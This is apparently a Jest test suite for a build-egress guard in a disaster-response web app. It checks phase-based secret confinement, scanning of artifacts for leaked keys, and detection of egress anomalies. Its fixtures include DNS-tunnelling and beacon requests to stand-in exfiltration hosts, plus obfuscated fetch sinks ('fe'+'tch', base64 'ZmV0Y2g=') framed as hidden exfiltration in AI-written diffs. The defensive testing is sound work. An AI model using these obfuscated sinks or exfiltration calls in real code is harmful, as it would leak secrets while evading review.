import { describe, it, expect, beforeEach } from "@jest/globals";
import {
  BuildEgressGuard,
  calculateShannonEntropy,
} from "../scripts/security/buildEgressGuard.js";

describe("ISP-094: Build-Egress Exfiltration Defense & Confinement Spike", () => {
  let guard;

  beforeEach(() => {
    guard = new BuildEgressGuard({
      entropyThreshold: 4.2,
      allowedHosts: [
        "registry.npmjs.org",
        "crates.io",
        "api.mapbox.com",
        "tiles.mapbox.com",
      ],
    });
  });

  describe("Phase-Based Environment Confinement", () => {
    it("should fail closed if any sensitive keys are present during install phase", () => {
      const contaminatedEnv = {
        NODE_ENV: "production",
        PATH: "/usr/bin",
        STELLAR_SECRET_KEY: "SB7R6K...FAKE",
        MAPBOX_SECRET_TOKEN: "sk.fake123",
      };

      const result = guard.enforcePhaseEnvironment("install", contaminatedEnv);
      expect(result.passed).toBe(false);
      expect(result.violations.length).toBe(2);
      expect(result.violations[0].reason).toContain("Install must be completely secret-free");
    });

    it("should pass clean install phase environment with only build/system variables", () => {
      const cleanEnv = {
        NODE_ENV: "production",
        PATH: "/usr/bin:/bin",
        HOME: "/home/runner",
        CI: "true",
      };

      const result = guard.enforcePhaseEnvironment("install", cleanEnv);
      expect(result.passed).toBe(true);
      expect(result.violations.length).toBe(0);
    });

    it("should reject Stellar signing keys in build phase", () => {
      const buildEnv = {
        NODE_ENV: "production",
        VITE_MAPBOX_PUBLIC_TOKEN: "pk.eyJ123",
        STELLAR_OPERATOR_SECRET: "SB7R...FAKE",
      };

      const result = guard.enforcePhaseEnvironment("build", buildEnv);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.key === "STELLAR_OPERATOR_SECRET")).toBe(true);
    });
  });

  describe("Artifact Secret & Canary Scanning", () => {
    it("should detect Stellar secret seed leaked into bundle or sourcemap", () => {
      const fakeSeed = "SB7R6KJ45ABCD1234EFGH5678IJKL9012MNOP3456QRST7890UVWX1234567";
      const artifacts = {
        "dist/assets/index-abc.js": `console.log("hello"); const secret = "${fakeSeed}";`,
      };

      const result = guard.scanArtifactsForSecrets(artifacts);
      expect(result.clean).toBe(false);
      expect(result.findings.some((f) => f.type === "STELLAR_SECRET_SEED")).toBe(true);
    });

    it("should detect Mapbox private secret token (sk.*) in dist files", () => {
      const artifacts = {
        "dist/assets/map-bundle.js": 'const mapToken = "sk.eyJ1234567890abcdefghijklmnopqrstuvwxyz";',
      };

      const result = guard.scanArtifactsForSecrets(artifacts);
      expect(result.clean).toBe(false);
      expect(result.findings.some((f) => f.type === "MAPBOX_SECRET_TOKEN")).toBe(true);
    });

    it("should detect canary secret tokens (SFAKECANARY / CANARY_*) in sourcemaps", () => {
      const artifacts = {
        "dist/assets/index.js.map": '{"version":3,"sources":["src/test.js"],"names":[],"mappings":"AAAA","sourcesContent":["CANARY_STELLAR_TEST_KEY_12345"]}',
      };

      const result = guard.scanArtifactsForSecrets(artifacts);
      expect(result.clean).toBe(false);
      expect(result.findings.some((f) => f.type === "CANARY_SECRET_LEAK")).toBe(true);
    });

    it("should pass clean build artifacts without secrets", () => {
      const cleanArtifacts = {
        "dist/assets/index.js": 'console.log("HelPhone Disaster Response PWA");',
        "dist/assets/index.css": ".map { width: 100%; }",
      };

      const result = guard.scanArtifactsForSecrets(cleanArtifacts);
      expect(result.clean).toBe(true);
      expect(result.findings.length).toBe(0);
    });
  });

  describe("Protocol-Aware Egress Anomaly Detection", () => {
    it("should flag DNS tunneling queries containing .exfil.invalid", () => {
      const requests = [
        { type: "dns", host: "SFAKECANARY123.exfil.invalid" },
      ];

      const result = guard.detectEgressAnomalies(requests);
      expect(result.safe).toBe(false);
      expect(result.anomalies.some((a) => a.type === "DNS_TUNNEL_EXFILTRATION")).toBe(true);
    });

    it("should flag query-string canary beacons to allowlisted hosts", () => {
      const requests = [
        {
          type: "http",
          destination: "https://api.mapbox.com/v4/test?canary=SFAKECANARY999888777",
        },
      ];

      const result = guard.detectEgressAnomalies(requests);
      expect(result.safe).toBe(false);
      expect(result.anomalies.some((a) => a.type === "QUERY_STRING_BEACON")).toBe(true);
    });

    it("should flag connections to unauthorized foreign hosts", () => {
      const requests = [
        { type: "tcp", host: "malicious-c2-collector.example.com" },
      ];

      const result = guard.detectEgressAnomalies(requests);
      expect(result.safe).toBe(false);
      expect(result.anomalies.some((a) => a.type === "UNAUTHORIZED_EGRESS_HOST")).toBe(true);
    });

    it("should pass legitimate traffic to allowlisted package and tile hosts", () => {
      const requests = [
        { type: "http", destination: "https://registry.npmjs.org/@sqlite.org/sqlite-wasm" },
        { type: "http", destination: "https://api.mapbox.com/v4/mapbox.streets-v8/1/0/0.pbf" },
      ];

      const result = guard.detectEgressAnomalies(requests);
      expect(result.safe).toBe(true);
      expect(result.anomalies.length).toBe(0);
    });
  });

  describe("Obfuscated Sink Detection in AI Diff Code", () => {
    it("should detect split string concatenation (\"fe\" + \"tch\")", () => {
      const aiDiff = 'const fn = window["fe" + "tch"]; fn("https://exfil.test");';
      const result = guard.detectObfuscatedSinks(aiDiff);
      expect(result.suspicious).toBe(true);
      expect(result.findings.some((f) => f.type === "OBFUSCATED_STRING_CONCAT")).toBe(true);
    });

    it("should detect template literal split network sink", () => {
      const aiDiff = 'const sink = `f${\'e\'}tch`;';
      const result = guard.detectObfuscatedSinks(aiDiff);
      expect(result.suspicious).toBe(true);
      expect(result.findings.some((f) => f.type === "OBFUSCATED_TEMPLATE_LITERAL")).toBe(true);
    });

    it("should detect base64 encoded sink calls", () => {
      const aiDiff = 'const handler = atob("ZmV0Y2g=");';
      const result = guard.detectObfuscatedSinks(aiDiff);
      expect(result.suspicious).toBe(true);
      expect(result.findings.some((f) => f.type === "OBFUSCATED_BASE64_SINK")).toBe(true);
    });
  });

  describe("Cryptographic Transcript Attestation", () => {
    it("should verify matching release transcript digest", () => {
      const transcript = "2026-10-18T12:00:00Z ALLOWED dst=registry.npmjs.org:443\n2026-10-18T12:00:01Z ALLOWED dst=api.mapbox.com:443\n";
      const crypto = require("node:crypto");
      const expectedDigest = crypto.createHash("sha256").update(transcript).digest("hex");

      const result = guard.verifyEgressTranscript(transcript, expectedDigest);
      expect(result.valid).toBe(true);
      expect(result.computedDigest).toBe(expectedDigest);
    });

    it("should fail verification on tampered transcript", () => {
      const originalTranscript = "CLEAN LOG";
      const crypto = require("node:crypto");
      const expectedDigest = crypto.createHash("sha256").update(originalTranscript).digest("hex");

      const tamperedTranscript = "TAMPERED LOG WITH UNLOGGED EGRESS";
      const result = guard.verifyEgressTranscript(tamperedTranscript, expectedDigest);

      expect(result.valid).toBe(false);
      expect(result.reason).toContain("Transcript digest mismatch");
    });
  });
});
